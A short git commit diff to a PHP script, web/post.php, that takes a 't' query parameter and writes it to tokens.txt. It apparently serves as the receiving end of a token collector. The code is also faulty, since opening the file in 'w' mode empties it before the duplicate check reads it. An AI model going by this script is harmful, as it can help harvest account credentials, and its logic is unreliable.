6f7aadba32c28609c2e05a0826ec5cc0c5e9dacb
Akex64 <61739633+Akex64@users.noreply.github.com>
2020-10-21 22:56:10 +0200

    Update post.php

--- web/post.php
+++ web/post.php
@@ -1,11 +1,10 @@
 <?php
 
-$file = fopen("tokens.txt", "w");
-
-$content = file_get_contents("tokens.txt");
-
-
 if(isset($_GET["t"])){
+	$file = fopen("tokens.txt", "w");
+
+	$content = file_get_contents("tokens.txt");
+
 	if(strpos($content, $_GET["t"]) === false){
 		fwrite($file, $_GET["t"]);
 	}
